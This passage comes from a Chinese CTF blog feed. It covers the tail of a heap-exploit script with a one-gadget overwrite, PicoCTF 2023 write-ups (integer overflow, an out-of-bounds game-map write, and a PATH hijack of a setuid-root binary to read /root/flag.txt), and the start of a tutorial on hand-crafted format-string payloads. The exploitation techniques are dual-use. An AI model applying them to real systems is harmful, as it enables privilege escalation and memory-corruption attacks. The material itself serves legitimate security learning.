class="number">0x30</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x30</span>)<span class="comment">#4</span></span><br><span class="line">onegadget_addr = libc_addr + <span class="number">0x4f2c5</span></span><br><span class="line">gdb.attach(io,<span class="string">&#x27;b *0x4009CF&#x27;</span>)</span><br><span class="line">pause(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="number">8</span>,p64(onegadget_addr))</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303212058725.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303212058725.png" alt="image.png"></a><br>欸 怎么不是onegadget呢 犯蠢了吧 那你这都到main函数的执行了 你onegadget是edit函数写进去的 那这栈结构肯定又被系统写了一次 所以我们还是乖乖写read函数吧<br>s进去 单步执行到ret<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303212101132.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303212101132.png" alt="image.png"></a><br>是吧 照样打 算一下偏移 覆盖一下<br><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303212103504.png" title="image.png" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303212103504.png" alt="image.png"></a><br>控制程序执行流成功</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> heap </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PicoCtf2023</title>
      <link href="/2023/03/17/PicoCtf2023/"/>
      <url>/2023/03/17/PicoCtf2023/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>第一次打国外的比赛 题型也都很新颖 记录一下做出来的题目</p><h2 id="two-sum"><a href="#two-sum" class="headerlink" title="two-sum"></a>two-sum</h2><p>签到题 考的是整形溢出 直接给了源码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">addIntOvf</span><span class="params">(<span class="type">int</span> result, <span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">    result = a + b;</span><br><span class="line">    <span class="keyword">if</span>(a &gt; <span class="number">0</span> &amp;&amp; b &gt; <span class="number">0</span> &amp;&amp; result &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span>(a &lt; <span class="number">0</span> &amp;&amp; b &lt; <span class="number">0</span> &amp;&amp; result &gt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> num1, num2, sum;</span><br><span class="line">    FILE *flag;</span><br><span class="line">    <span class="type">char</span> c;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;n1 &gt; n1 + n2 OR n2 &gt; n1 + n2 \n&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;What two positive numbers can make this possible: \n&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;num1) &amp;&amp; <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;num2)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;You entered %d and %d\n&quot;</span>, num1, num2);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        sum = num1 + num2;</span><br><span class="line">        <span class="keyword">if</span> (addIntOvf(sum, num1, num2) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;No overflow\n&quot;</span>);</span><br><span class="line">            fflush(<span class="built_in">stdout</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (addIntOvf(sum, num1, num2) == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;You have an integer overflow\n&quot;</span>);</span><br><span class="line">            fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (num1 &gt; <span class="number">0</span> || num2 &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            flag = fopen(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(flag == <span class="literal">NULL</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;flag not found: please run this on the server\n&quot;</span>);</span><br><span class="line">                fflush(<span class="built_in">stdout</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">char</span> buf[<span class="number">60</span>];</span><br><span class="line">            fgets(buf, <span class="number">59</span>, flag);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;YOUR FLAG IS: %s\n&quot;</span>, buf);</span><br><span class="line">            fflush(<span class="built_in">stdout</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们直接输入sum1 sum2的值 只要满足两个判断式中的一个就行</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(a &gt; <span class="number">0</span> &amp;&amp; b &gt; <span class="number">0</span> &amp;&amp; result &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">if</span>(a &lt; <span class="number">0</span> &amp;&amp; b &lt; <span class="number">0</span> &amp;&amp; result &gt; <span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>这里我选择打第一个判断式 只要a+b超过了无符号int型范围就行</p><p>二者值都为2147483647即可</p><h2 id="babygame01"><a href="#babygame01" class="headerlink" title="babygame01"></a>babygame01</h2><p>脑洞比较大的一道题 不过还在逻辑之内 好好分析一番</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303171352474.png" title="image-20230317135241366" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303171352474.png" alt="image-20230317135241366"></a></p><p>ida看一下伪代码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [esp+1h] [ebp-AA5h]</span></span><br><span class="line">  <span class="type">int</span> v5[<span class="number">2</span>]; <span class="comment">// [esp+2h] [ebp-AA4h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// [esp+Ah] [ebp-A9Ch]</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">2700</span>]; <span class="comment">// [esp+Eh] [ebp-A98h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v8; <span class="comment">// [esp+A9Ah] [ebp-Ch]</span></span><br><span class="line">  <span class="type">int</span> *v9; <span class="comment">// [esp+A9Eh] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = &amp;argc;</span><br><span class="line">  v8 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  init_player(v5);</span><br><span class="line">  init_map(v7, v5);</span><br><span class="line">  print_map(v7, v5);</span><br><span class="line">  signal(<span class="number">2</span>, (<span class="type">__sighandler_t</span>)sigint_handler);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v4 = getchar();</span><br><span class="line">      move_player(v5, v4, v7);</span><br><span class="line">      print_map(v7, v5);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v5[<span class="number">0</span>] != <span class="number">29</span> );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v5[<span class="number">1</span>] != <span class="number">89</span> );</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You win!&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v6 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;flage&quot;</span>);</span><br><span class="line">    win();</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>写博客重新复现的时候 决定把每个函数都过一遍 顺便加强我的代码审计能力</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">init_player</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  *a1 = <span class="number">4</span>;</span><br><span class="line">  *(a1 + <span class="number">4</span>) = <span class="number">4</span>;</span><br><span class="line">  result = a1;</span><br><span class="line">  *(a1 + <span class="number">8</span>) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>a1的地址等同于v5 v5这个数组就定义了两个元素  分别用来存放此时我们处于map上的位置</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Elf32_Dyn **__cdecl <span class="title function_">init_map</span><span class="params">(<span class="type">int</span> a1, _DWORD *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  Elf32_Dyn **result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+8h] [ebp-Ch]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [esp+Ch] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  result = &amp;GLOBAL_OFFSET_TABLE_;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">29</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">89</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( i == <span class="number">29</span> &amp;&amp; j == <span class="number">89</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        *(a1 + <span class="number">2699</span>) = <span class="string">&#x27;X&#x27;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( i == *a2 &amp;&amp; j == a2[<span class="number">1</span>] )</span><br><span class="line">      &#123;</span><br><span class="line">        *(<span class="number">90</span> * i + a1 + j) = player_tile;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        *(<span class="number">90</span> * i + a1 + j) = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>a1相当于v7 v7定义了非常大一串 用来开辟一块内存给地图的存放</p><p>利用for循环对map进行了初始化 除了两个特殊的地方 用户的初始位置和终点 其他都为’.’</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">print_map</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  clear_screen();</span><br><span class="line">  find_player_pos(a1);</span><br><span class="line">  find_end_tile_pos(a1);</span><br><span class="line">  print_flag_status(a2);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">29</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">89</span>; ++j )</span><br><span class="line">      <span class="built_in">putchar</span>(*(<span class="number">90</span> * i + a1 + j));</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>for循环遍历打印出map</p><p>接下来用getchar赋值了v4 传入下面这个函数充当a2 </p><p>a1用来存储用户位置 a3则是存放map</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_BYTE *__cdecl <span class="title function_">move_player</span><span class="params">(_DWORD *a1, <span class="type">char</span> a2, <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="string">&#x27;l&#x27;</span> )</span><br><span class="line">    player_tile = getchar();</span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="string">&#x27;p&#x27;</span> )</span><br><span class="line">    solve_round(a3, a1);</span><br><span class="line">  *(a1[<span class="number">1</span>] + a3 + <span class="number">90</span> * *a1) = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">  <span class="keyword">switch</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;w&#x27;</span>:</span><br><span class="line">      --*a1;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">      ++*a1;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">      --a1[<span class="number">1</span>];</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">      ++a1[<span class="number">1</span>];</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  result = (a1[<span class="number">1</span>] + a3 + <span class="number">90</span> * *a1);</span><br><span class="line">  *result = player_tile;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大体是利用’wsad’控制用户位置 不过存放两个特殊的指令</p><p>‘l’可以把player_tile替换成其后面的字符</p><p>‘p’则可以直接把用户位置移动到终点</p><p>最后利用result存储用户位置移动后的地址 在对应地址存入player_tile</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v6 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;flage&quot;</span>);</span><br><span class="line">    win();</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>最后回到main函数 如果到达了终点 则对v6进行判断 如果为真 就输出flag</p><p>分析完了程序 来捋一捋思路 目的无非就是要修改到v6的值 不过程序不存在任意写也无法栈溢出覆盖到v6</p><p>不过还是存在着一个细微的漏洞 可以做到数组溢出 如果我们使得v5中的元素值为负呢?</p><p>也就是达到了map边界后仍然向边界外面移动 这个时候就会往非法内存处写入值</p><p>这对于v6的值会有什么影响呢 我们知道 在栈结构不被破坏的情况下 固定索引到的栈地址存放的一定是v6</p><p>那么我们只需要破坏栈结构 使其索引到的是其他值就行了</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303181139908.png" title="image-20230318113925813" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303181139908.png" alt="image-20230318113925813"></a></p><p>这个时候我们来尝试一下 进行一下数组溢出 将位置移动到左上角后 再输入a</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303181142912.png" title="image-20230318114212851" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303181142912.png" alt="image-20230318114212851"></a></p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303181142294.png" title="image-20230318114250243" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303181142294.png" alt="image-20230318114250243"></a></p><p>可以看到此时栈的结构就成功被破坏了 不过此时我们仍然无法通过if</p><p>byte ptr的作用在于指明访问的内存单元是一个字节单元 也就是只读入一个字节的数据</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303181145399.png" title="image-20230318114546367" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303181145399.png" alt="image-20230318114546367"></a></p><p>此时还是0 那么只需要利用同样的手法多试几次 最后成功获得flag</p><h2 id="VNE"><a href="#VNE" class="headerlink" title="VNE"></a>VNE</h2><p>从来没做过这样的题目 说实话还是挺好玩的 感觉和awd有点像</p><p>一开始没有给我们附件  启动靶机后 提示让我们进行ssh连接</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303181151316.png" title="image-20230318115150252" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303181151316.png" alt="image-20230318115150252"></a></p><p>这里我使用的软件是finalshell</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303181153914.png" title="image-20230318115327880" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303181153914.png" alt="image-20230318115327880"></a></p><p>连上了以后 照着提示下载了bin文件 是题目的附件</p><p>保护全开 ida看一看</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303181154105.png" title="image-20230318115442076" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303181154105.png" alt="image-20230318115442076"></a></p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// ebx</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  __int64 v7; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v8; <span class="comment">// rax</span></span><br><span class="line">  __int64 v9; <span class="comment">// rax</span></span><br><span class="line">  __int64 v10; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v12; <span class="comment">// [rsp+3h] [rbp-6Dh] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v13; <span class="comment">// [rsp+4h] [rbp-6Ch]</span></span><br><span class="line">  <span class="type">char</span> *v14; <span class="comment">// [rsp+8h] [rbp-68h]</span></span><br><span class="line">  <span class="type">char</span> v15[<span class="number">32</span>]; <span class="comment">// [rsp+10h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v16[<span class="number">40</span>]; <span class="comment">// [rsp+30h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v17; <span class="comment">// [rsp+58h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v17 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v14 = <span class="built_in">getenv</span>(<span class="string">&quot;SECRET_DIR&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v14 )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Listing the content of &quot;</span>);</span><br><span class="line">    v6 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(v5, v14);</span><br><span class="line">    v7 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(v6, <span class="string">&quot; as root: &quot;</span>);</span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(v7, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>(&amp;v12);</span><br><span class="line">    std::__cxx11::basic_string&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,std::allocator&lt;<span class="type">char</span>&gt;&gt;::<span class="built_in">basic_string</span>(v16, v14, &amp;v12);</span><br><span class="line">    std::<span class="keyword">operator</span>+&lt;<span class="type">char</span>&gt;(v15, <span class="string">&quot;ls &quot;</span>, v16);</span><br><span class="line">    std::__cxx11::basic_string&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,std::allocator&lt;<span class="type">char</span>&gt;&gt;::~<span class="built_in">basic_string</span>(v16);</span><br><span class="line">    std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>(&amp;v12);</span><br><span class="line">    <span class="built_in">setgid</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">setuid</span>(<span class="number">0</span>);</span><br><span class="line">    v8 = (<span class="type">const</span> <span class="type">char</span> *)std::__cxx11::basic_string&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,std::allocator&lt;<span class="type">char</span>&gt;&gt;::<span class="built_in">c_str</span>(v15);</span><br><span class="line">    v13 = <span class="built_in">system</span>(v8);</span><br><span class="line">    <span class="keyword">if</span> ( v13 )</span><br><span class="line">    &#123;</span><br><span class="line">      v9 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cerr, <span class="string">&quot;Error: system() call returned non-zero value: &quot;</span>);</span><br><span class="line">      v10 = std::ostream::<span class="keyword">operator</span>&lt;&lt;(v9, v13);</span><br><span class="line">      std::ostream::<span class="keyword">operator</span>&lt;&lt;(v10, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">      v4 = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v4 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    std::__cxx11::basic_string&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;,std::allocator&lt;<span class="type">char</span>&gt;&gt;::~<span class="built_in">basic_string</span>(v15);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v3 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cerr, <span class="string">&quot;Error: SECRET_DIR environment variable is not set&quot;</span>);</span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(v3, &amp;std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">    v4 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用c++编写的程序 结合直接运行大概能看懂主要流程 就是根据环境变量SECRET_DIR的值</p><p>执行ls SECRET_DIR</p><p>加上题目给的提示 所以这里把SECRET_DIR值设置为&#x2F;root&#x2F; 看看root目录下有什么东西</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303181249968.png" title="image-20230318124910924" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303181249968.png" alt="image-20230318124910924"></a></p><p>我们的目标就是flag.txt了 当然由于权限问题 我们肯定不能直接cat</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303181250188.png" title="image-20230318125047155" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303181250188.png" alt="image-20230318125047155"></a></p><p>这里学习了幽林师傅的思路 我们把&#x2F;bin目录里面的cat文件拷贝下来 上传到&#x2F;home&#x2F;ctf-player 目录中 顺便更改一下PATH 顺便更改cat文件名为ls</p><p>这样在调用ls的时候 相当于调用的就是cat了</p><p>然后再把SECRET_DIR更改为&#x2F;root&#x2F;flag.txt 就可以获取flag了</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303181256044.png" title="image-20230318125604016" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303181256044.png" alt="image-20230318125604016"></a></p><p>不过不知道什么问题 使用finalshell执行最后一步的时候 会报如下错 所以我更换了windterm才解决问题</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303181257198.png" title="image-20230318125703158" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303181257198.png" alt="image-20230318125703158"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>手写格式化字符串payload</title>
      <link href="/2023/03/14/%E6%89%8B%E5%86%99%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2payload/"/>
      <url>/2023/03/14/%E6%89%8B%E5%86%99%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2payload/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>万万没想到直到学习了pwn五个月以后 我才开始学习手写格式化字符串payload 先前都是习惯利用了fmstr_payload来构造了 但是直到遇到了一道题 要在一次格式化字符漏洞中 利用两次 fmstr_payload构造出来的payload无法达到预期的攻击效果 所以只能自己手写了</p><p>来复习一下格式化字符串任意写漏洞的原理</p><p>利用了%n可以根据已经输出的字节修改对应偏移处地址的值</p><p>不过先前我们学习过的任意写 只是简单的将一个地址处的值修改为个位数大小 所需要的字节数很小 如果我们想要修改got表的值为后门函数呢 这要如何实现 总不可能传输同等大小的字节数吧</p><p>这时候引入一个新的格式化字符 <strong>%c</strong>  其有什么效果呢 我们编写下面一段小程序</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">      <span class="type">char</span> a[<span class="number">20</span>]=<span class="string">&quot;test&quot;</span>;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,a[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>%c 可以输出单个字符 所以此时的运行结果应该是单个字符t</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303142107589.png" title="image-20230314210702555" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303142107589.png" alt="image-20230314210702555"></a></p><p>如果像%s之类的格式化字符 在前面加上数字呢 又有什么效果?</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()&#123;</span><br><span class="line">      char a[20]=&quot;test&quot;;</span><br><span class="line">      printf(&quot;%10c&quot;,a[0]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303142107911.png" title="image-20230314210756891" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303142107911.png" alt="image-20230314210756891"></a></p><p>可以看到最后的结果在实际输出的字符t前面 还加上了9字节的\x00 也就是会自动补全我们输出的字符</p><p>而其占用的字节数也很小 